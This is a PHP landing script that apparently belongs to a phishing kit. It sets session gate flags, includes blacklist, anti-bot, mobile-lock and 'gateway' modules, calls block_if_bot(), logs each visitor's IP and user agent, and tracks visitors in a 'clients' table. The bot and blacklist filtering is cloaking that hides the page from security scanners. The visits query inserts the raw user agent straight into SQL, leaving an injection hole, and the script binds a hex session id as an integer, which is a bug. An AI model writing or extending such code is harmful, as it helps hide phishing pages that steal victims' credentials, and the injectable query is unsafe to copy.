<?php
ob_start(); // keep this

// ================= SESSION FIRST =================
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}


// ================= RESET =================
if (isset($_GET["reset"])) {

    unset(
        $_SESSION["captcha_passed"],
        $_SESSION["remote_gate_ok"],
        $_SESSION["started"],
        $_SESSION["uniqueid"]
    );

    header("Location: index.php");
    exit;
}


// ================= GATE SESSION =================
// Keep same session for the next pages
if (empty($_SESSION["uniqueid"])) {
    $_SESSION["uniqueid"] = bin2hex(random_bytes(16));
}

$_SESSION["started"] = "true";


// ================= NORMAL INCLUDES =================
include 'void/inc/config.php';
include 'void/inc/connect.php';

if ($mobile_lock == "checked") {
    include "void/inc/mob_lock.php";
}

include 'void/inc/blacklist.php';


// ================= GATEWAY =================
// KEEP THIS BEFORE BOT CHECK
include 'void/inc/gateway.php';


// ================= BOT CHECK AFTER GATEWAY =================
$checkPath = __DIR__;

while (!file_exists($checkPath . '/protection/check.php')) {

    $checkPath = dirname($checkPath);

    if ($checkPath === dirname($checkPath)) {
        die('enhanced_check.php not found');
    }
}

include_once $checkPath . '/protection/check.php';

block_if_bot();


// ================= ANTIBOT =================
if ($enable_antibots == "checked") {
    include 'void/inc/anti.php';
}


// ================= VAULT INCLUDE AFTER PROTECTION =================
if (!defined('VAULT_APP')) {
    define('VAULT_APP', 1);
}

require_once __DIR__ . '/inc/vault.php';


// ================= SESSION SAFETY =================
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];


$query = mysqli_query($conn, "SELECT * FROM visits WHERE ua='$ua' AND ip='$ip'");
$num = mysqli_num_rows($query);
if ($num == 0) {
   mysqli_query($conn, "INSERT INTO visits (ua, ip) VALUES ('$ua', '$ip')");
}

if (isset($_SESSION['started']) && $_SESSION['started'] == 'true') {
    $uniqueid = $_SESSION['uniqueid'];

    $stmt = $conn->prepare("SELECT * FROM clients WHERE uniqueid = ?");
    if ($stmt) {
        $stmt->bind_param("i", $uniqueid);
        $stmt->execute();
        $result = $stmt->get_result();
        if ($result->num_rows > 0) {
            $row = $result->fetch_assoc();

            // ✅ FIX WARNING (important)
            $home = trim($row['home'] ?? '');

        }
    }
}
?>

